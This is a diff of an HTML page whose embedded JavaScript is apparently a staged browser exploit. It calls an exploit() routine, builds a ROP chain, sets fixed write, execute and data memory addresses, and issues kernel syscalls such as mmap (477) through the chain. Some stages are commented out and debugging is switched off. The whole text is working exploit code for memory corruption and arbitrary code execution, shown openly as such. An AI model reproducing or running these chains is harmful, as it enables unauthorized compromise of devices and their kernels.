@@ -12,7 +12,7 @@
 		<script type='text/javascript'>
 			var loopOnExit = true;
 
-			var debug = 3;
+			var debug = 0;
 			var debugWait = 4000;
 
 			function searchURIToObject(searchURI)
@@ -100,11 +100,13 @@
 			{
 				exploit();
 				var chain = new rop();
-				
+
 				var size = 0x100000;
 				var writeAddress = 0x926100000;
-    			var executeAddress = 0x93a300000;
-    			var dataAddress = 0x93a400000;
+				//var execAddress = 0x926200000;
+				var execAddress = 0x93a300000;
+				//var dataAddress = 0x926300000;
+				var dataAddress = 0x93a400000;
 				var dataSegmentCount = 3;
 
 				var params = searchURIToObject(window.location.search);
@@ -131,6 +133,9 @@
 						chain.execute(function(){ params['wh1'] = getU32from(chain.data); nextStage(params); });
 						break;
 					case 2:
+						//chain.call('mapSharedMemory', LIBKERNEL, 0x15210, params['wh1'], 1 | 2, chain.data);
+						//chain.execute(function(){ params['wa1'] = getU64from(chain.data); nextStage(params); });
+						//break;
 						chain.syscall('mmap', 477, writeAddress, size, 1 | 2, 0xf | 0x2, params['wh1'], 0);
 						chain.write_rax_ToVariable(0);
 						chain.execute(function(){ params['wa1'] = chain.getVariable(0); nextStage(params); });
